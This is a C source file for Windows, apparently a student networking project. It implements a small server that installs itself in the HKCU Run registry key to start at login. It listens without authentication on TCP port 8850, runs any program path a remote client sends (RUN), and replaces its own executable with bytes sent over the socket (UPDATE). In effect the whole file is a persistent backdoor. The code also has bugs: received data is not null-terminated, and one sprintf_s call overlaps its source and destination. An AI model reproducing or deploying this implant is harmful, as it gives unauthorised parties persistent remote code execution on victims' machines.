//Eliyahu Gamliel - Project part B - Server

#undef UNICODE

#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")

#define DEFAULT_BUFLEN 1024
#define DEFAULT_PORT "8850"

#define Reg_Path "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

#define VERSION "1.0.0" //Number of Version

char resolveOption(char input[]) { //Type Command
    if (!strcmp(input, "PING")) return 'p';
    if (!strcmp(input, "RUN")) return 'r';
    if (!strcmp(input, "UPDATE")) return 'u';
    if (!strcmp(input, "VERSION")) return 'v';
    return 'e';
}

int main()
{
    //LEVEL 1//
    HANDLE hMyMutex = CreateMutexA(NULL, FALSE, "MU");
    DWORD waitResult = WaitForSingleObject(hMyMutex, 0);
    if (waitResult != WAIT_OBJECT_0) { //If the program not running in parllel
        printf("%s", "Close The Program!");
        return 0;
    }
    ///////////
    //Writing for the Registry
    HKEY reg1;
    RegOpenKeyA(HKEY_CURRENT_USER, Reg_Path, &reg1);
    HKEY key;
    RegCreateKeyA(reg1, "myProject", &key);
    PCHAR Exe_Path = (PCHAR)malloc(1024);
    GetModuleFileNameA(NULL, Exe_Path, 1024);
    RegSetKeyValueA(reg1, NULL, "myProject", REG_SZ, Exe_Path, sizeof(CHAR)*strlen(Exe_Path));
    RegCloseKey(reg1);
    ///////////

    WSADATA wsaData;
    int iResult;
    int sendResult;

    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET ClientSocket = INVALID_SOCKET;

    struct addrinfo* result = NULL;
    struct addrinfo hints;

    int iSendResult;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    // Resolve the server address and port
    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Create a SOCKET for connecting to server
    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    // Setup the TCP listening socket
    iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        printf("bind failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    freeaddrinfo(result);

    iResult = listen(ListenSocket, SOMAXCONN);
    if (iResult == SOCKET_ERROR) {
        printf("listen failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    // Accept a client socket
    ClientSocket = accept(ListenSocket, NULL, NULL);
    if (ClientSocket == INVALID_SOCKET) {
        printf("accept failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    // No longer need server socket
    closesocket(ListenSocket);

    // Receive until the peer shuts down the connection
    do {
        iResult = recv(ClientSocket, recvbuf, recvbuflen, 0); //recieve command from the clinet
        if (iResult > 0) {
            switch (resolveOption(recvbuf))
            {
            //LEVEL 2//
            case 'p': //"PING"
            {
                send(ClientSocket, "PONG\n", strlen("PONG\n") + 1, 0); //Send "PONG"
                break;
            }
            //LEVEL 3//
            case 'r': //"RUN"
            {
                recv(ClientSocket, recvbuf, recvbuflen, 0); //Path to Run
                STARTUPINFOA si;
                PROCESS_INFORMATION pi;
                ZeroMemory(&si, sizeof(si));
                si.cb = sizeof(si);
                ZeroMemory(&pi, sizeof(pi));
                CreateProcessA(NULL, recvbuf, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                break;
            }
            //LEVEL 4//
            case 'u': //"UPDATE"
            {
                char size[1024];
                char buf[65536];
                recv(ClientSocket, size, 1024, 0);
                recv(ClientSocket, buf, 65536, 0);
                PCHAR Old_Exe_Path = (PCHAR)malloc(1024);
                GetModuleFileNameA(NULL, Exe_Path, 1024);
                GetModuleFileNameA(NULL, Old_Exe_Path, 1024);
                Old_Exe_Path[strlen(Old_Exe_Path) - 4] = '\0';
                sprintf_s(Old_Exe_Path, 1024, "%s%s", Old_Exe_Path, "_temp.exe");
                DeleteFileA(Old_Exe_Path);
                rename(Exe_Path, Old_Exe_Path);
                HANDLE file = CreateFileA(Exe_Path, GENERIC_WRITE, FILE_SHARE_WRITE|FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                DWORD fS = GetLastError();
                DWORD fSize = 0;
                int s = atoi(size);
                WriteFile(file, buf, s, &fSize, NULL);
                CloseHandle(file);
                break;
            }
            case 'v': //"VERSION"
            {
                send(ClientSocket, VERSION"\n", strlen(VERSION"\n") + 1, 0); //Send the number of version
                break;
            }
            default: //"UNKNOWN COMMAND"
                send(ClientSocket, "Unknown command\n", strlen("Unknown command\n") + 1, 0); //Send ""Unknown command"
                break;
            }
        }
        else if (iResult == 0)
            printf("Connection closing...\n");
        else {
            printf("recv failed with error: %d\n", WSAGetLastError());
            closesocket(ClientSocket);
            WSACleanup();
            return 1;
        }

    } while (iResult > 0);

    // shutdown the connection since we're done
    iResult = shutdown(ClientSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ClientSocket);
        WSACleanup();
        return 1;
    }

    // cleanup
    closesocket(ClientSocket);
    WSACleanup();

    ReleaseMutex(hMyMutex);
    CloseHandle(hMyMutex);

    return 0;
}
